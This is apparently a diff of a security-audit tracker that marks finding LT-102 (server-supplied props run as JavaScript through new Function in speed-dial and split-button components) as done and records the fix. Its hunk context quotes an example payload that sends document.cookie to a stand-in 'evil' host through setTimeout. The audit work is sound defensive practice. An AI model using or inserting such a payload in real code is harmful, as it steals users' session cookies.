@@ -86,7 +86,8 @@ setTimeout('fetch("//evil/"+document.cookie)')       // setTimeout is not shadow
 ---
 
 ### `LT-102` — Server-supplied props executed as JavaScript
-**Severity:** P0 · **Status:** todo · **Files:** `src/components/speed-dial.ts:749`, `src/components/split-button.ts:631`
+**Severity:** P0 · **Status:** done · **Files:** `src/components/speed-dial.ts:749`, `src/components/split-button.ts:631`
+**Resolution:** Created centralized `src/runtime/commands.ts` (`registerCommand`, `executeCommand`, etc.). Refactored `speed-dial.ts` and `split-button.ts` to execute registered command handlers safely by key and sanitize navigation URLs. Verified 0 occurrences of `new Function` in `src/components/`.
 
 **Evidence.**
 ```ts
